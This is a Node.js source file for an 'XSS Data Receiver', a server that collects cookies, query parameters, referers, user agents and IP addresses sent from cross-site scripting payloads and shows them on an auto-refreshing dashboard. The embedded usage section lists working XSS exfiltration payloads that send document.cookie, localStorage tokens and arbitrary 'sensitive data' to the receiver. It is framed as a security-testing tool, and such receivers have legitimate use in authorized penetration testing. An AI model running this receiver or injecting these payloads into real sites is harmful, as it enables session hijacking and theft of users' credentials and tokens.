const http = require('http');

// ===== CONFIGURATION =====
// This is the URL where this receiver is accessible (change when deploying to remote server)
const RECEIVER_URL = 'http://example.com:3333';
// =========================

// Store recent requests in memory
const requests = [];
const MAX_REQUESTS = 50;

const server = http.createServer((req, res) => {
  const url = new URL(req.url, `http://${req.headers.host}`);

  // Check for clear action
  if (url.searchParams.get('action') === 'clear') {
    requests.length = 0; // Clear all logs
    console.log('Logs cleared!');
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ success: true, message: 'Logs cleared' }));
    return;
  }

  // Only log requests with query parameters (actual data being sent)
  const hasParams = url.searchParams.size > 0;

  if (hasParams) {
    // Log the request with Estonia/Tallinn timezone
    const estoniaTime = new Date().toLocaleString('en-GB', {
      timeZone: 'Europe/Tallinn',
      year: 'numeric',
      month: '2-digit',
      day: '2-digit',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
      hour12: false
    });

    const requestData = {
      timestamp: estoniaTime,
      url: req.url,
      method: req.method,
      params: Object.fromEntries(url.searchParams),
      cookies: req.headers.cookie || 'None',
      referer: req.headers.referer || 'None',
      userAgent: req.headers['user-agent'] || 'None',
      ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress
    };

    // Add to requests log
    requests.unshift(requestData);
    if (requests.length > MAX_REQUESTS) {
      requests.pop();
    }

    // Log to console
    console.log(`[${requestData.timestamp}] ${requestData.method} ${requestData.url}`);
    console.log(`  Params:`, requestData.params);
    console.log(`  Cookies:`, requestData.cookies);
    console.log(`  Referer:`, requestData.referer);
  }

  const html = `
<!DOCTYPE html>
<html>
<head>
  <title>XSS Data Receiver</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: 'Courier New', monospace;
      background: #1e1e1e;
      color: #d4d4d4;
      padding: 20px;
    }
    .container {
      max-width: 1200px;
      margin: 0 auto;
    }
    h1 {
      color: #4ec9b0;
      margin-bottom: 10px;
    }
    .info {
      color: #6a9955;
      margin-bottom: 20px;
      font-size: 14px;
    }
    .section {
      background: #252526;
      padding: 15px;
      margin-bottom: 20px;
      border-radius: 4px;
      border-left: 3px solid #007acc;
    }
    .section h2 {
      color: #569cd6;
      font-size: 16px;
      margin-bottom: 10px;
    }
    .request {
      background: #2d2d30;
      padding: 12px;
      margin-bottom: 10px;
      border-radius: 4px;
      font-size: 13px;
    }
    .request .timestamp {
      color: #ce9178;
      font-weight: bold;
    }
    .request .label {
      color: #9cdcfe;
      display: inline-block;
      min-width: 100px;
    }
    .request .value {
      color: #ce9178;
      word-break: break-all;
    }
    .code {
      background: #1e1e1e;
      padding: 10px;
      border-radius: 4px;
      margin-top: 10px;
      font-size: 12px;
      color: #ce9178;
      overflow-x: auto;
    }
    .refresh {
      background: #0e639c;
      color: white;
      border: none;
      padding: 10px 20px;
      border-radius: 4px;
      cursor: pointer;
      font-family: inherit;
      margin-bottom: 20px;
      margin-right: 10px;
    }
    .refresh:hover {
      background: #1177bb;
    }
    .clear {
      background: #d32f2f;
      color: white;
      border: none;
      padding: 10px 20px;
      border-radius: 4px;
      cursor: pointer;
      font-family: inherit;
      margin-bottom: 20px;
    }
    .clear:hover {
      background: #c62828;
    }
  </style>
  <script>
    // Auto-refresh every 5 seconds
    setTimeout(() => location.reload(), 5000);

    // Clear logs function
    function clearLogs() {
      if (confirm('Are you sure you want to clear all logs?')) {
        fetch('?action=clear')
          .then(res => res.json())
          .then(data => {
            alert('Logs cleared successfully!');
            location.reload();
          })
          .catch(err => {
            alert('Error clearing logs');
          });
      }
    }
  </script>
</head>
<body>
  <div class="container">
    <h1>XSS Data Receiver</h1>
    <div class="info">This page collects data from XSS payloads for security testing purposes. Auto-refreshes every 5 seconds.</div>

    <button class="refresh" onclick="location.reload()">Refresh Now</button>
    <button class="clear" onclick="clearLogs()">Clear All Logs</button>

    <div class="section">
      <h2>Usage Examples</h2>
      <div class="code">
// Send data via image tag<br>
&lt;img src="${RECEIVER_URL}/?data=STOLEN_DATA"&gt;<br><br>
// Send cookies<br>
&lt;script&gt;new Image().src='${RECEIVER_URL}/?c='+document.cookie&lt;/script&gt;<br><br>
// Send any data<br>
&lt;script&gt;fetch('${RECEIVER_URL}/?data='+encodeURIComponent(sensitiveData))&lt;/script&gt;<br><br>
// Send via navigation<br>
&lt;script&gt;location='${RECEIVER_URL}/?token='+localStorage.token&lt;/script&gt;
      </div>
    </div>

    <div class="section">
      <h2>Recent Requests (${requests.length}/${MAX_REQUESTS})</h2>
      ${requests.map(req => `
        <div class="request">
          <div class="timestamp">${req.timestamp}</div>
          <div><span class="label">Method:</span> <span class="value">${req.method}</span></div>
          <div><span class="label">URL:</span> <span class="value">${req.url}</span></div>
          <div><span class="label">Parameters:</span> <span class="value">${JSON.stringify(req.params)}</span></div>
          <div><span class="label">Cookies:</span> <span class="value">${req.cookies}</span></div>
          <div><span class="label">Referer:</span> <span class="value">${req.referer}</span></div>
          <div><span class="label">User-Agent:</span> <span class="value">${req.userAgent}</span></div>
          <div><span class="label">IP:</span> <span class="value">${req.ip}</span></div>
        </div>
      `).join('')}
    </div>
  </div>
</body>
</html>
  `;

  res.writeHead(200, {
    'Content-Type': 'text/html',
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
    'Access-Control-Allow-Headers': '*',
  });
  res.end(html);
});

server.listen(3333, '0.0.0.0', () => {
  console.log('XSS Data Receiver running on http://0.0.0.0:3333');
  console.log('Listening for incoming requests...');
});
